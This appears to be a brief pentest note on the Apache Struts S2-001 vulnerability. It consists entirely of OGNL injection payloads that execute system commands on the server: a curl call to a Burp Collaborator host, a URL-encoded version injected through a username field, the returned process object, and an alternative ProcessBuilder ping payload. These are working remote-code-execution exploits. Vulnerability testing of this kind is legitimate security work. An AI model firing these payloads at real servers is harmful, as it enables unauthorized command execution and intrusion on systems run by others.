# struts-vuln

### s2-001:
- Minimal payload:
```
%{@java.lang.Runtime@getRuntime().exec('curl 132poma4l3k2ugiooej4aptsqjwck1.burpcollaborator.net')}
```
- url encoded:
``` 
username=%25{@java.lang.Runtime@getRuntime().exec('curl 132poma4l3k2ugiooej4aptsqjwck1.burpcollaborator.net')}
```

- Output: `java.lang.UNIXProcess@58f17c3c`

- Alternative payload:

```
%{(new java.lang.ProcessBuilder(new java.lang.String []{"ping","yz1h62j86v3zxqvq1xl5g967iyoocd.burpcollaborator.net"})).start()}
```
